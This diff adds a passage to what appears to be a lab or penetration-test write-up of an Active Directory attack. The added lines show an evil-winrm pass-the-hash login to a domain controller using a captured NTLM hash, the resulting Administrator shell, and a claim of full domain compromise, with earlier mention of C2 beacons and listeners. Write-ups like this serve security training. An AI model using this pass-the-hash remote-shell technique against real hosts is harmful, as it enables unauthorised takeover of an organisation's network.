@@ -719,5 +719,18 @@ Ill now generate the beacon for my root DC listener
 Ive changed my last listener for the root DC to TCP since it doesnt seem to connect over http
 
 ```python
-
+evil-winrm -i dc.darkhaven.tech -u Administrator -H 'b38a41e844c5c3d706c1e9e575f3e62c'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
+Administrator access!
+
+And full domain compromise!
+
